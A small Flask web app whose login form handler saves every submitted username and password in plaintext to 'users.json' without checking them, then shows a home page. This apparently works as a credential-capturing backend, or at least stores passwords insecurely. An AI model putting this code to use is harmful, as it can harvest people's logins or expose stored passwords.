from flask import Flask, render_template, request
import time
import json

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/home', methods=['POST'])
def submit():

    try:
        with open('users.json', 'r') as f:
            users = json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):

        users = []

    username = request.form.get('username')

    password = request.form.get('password')

    users.append({'username': username, 'password': password})

    with open('users.json', 'w') as f:
        json.dump(users, f, indent=4)

    time.sleep(1) 

    return render_template('index.html')



    
